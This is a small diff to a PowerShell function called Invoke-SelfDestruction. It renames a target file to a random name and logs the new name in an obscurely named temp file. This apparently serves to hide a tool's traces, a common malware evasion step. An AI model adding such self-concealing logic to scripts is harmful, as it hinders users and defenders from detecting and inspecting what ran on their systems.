@@ -30,11 +30,15 @@ function Invoke-SelfDestruction {
 
 
 
+        $xx = ([System.IO.Path]::GetRandomFileName() + [System.IO.Path]::GetExtension($f))
 
-        Rename-Item -Path $f -NewName ([System.IO.Path]::GetRandomFileName() + [System.IO.Path]::GetExtension($f)) -Force
+        Rename-Item -Path $f -NewName $xx -Force
 
-
-        New-Item -Path "$env:temp\jMEmdVuJAtNea.txt" -ItemType File -Force
+        if(Test-Path -Path "$env:temp\jMEmdVuJAtNea.txt" -PathType Leaf){
+            Remove-Item -Path "$env:temp\jMEmdVuJAtNea.txt" -Force -Recurse -ErrorAction SilentlyContinue
+        }
+        
+        Add-Content -Path "$env:temp\jMEmdVuJAtNea.txt" -Value $xx -Force
     
 }
 
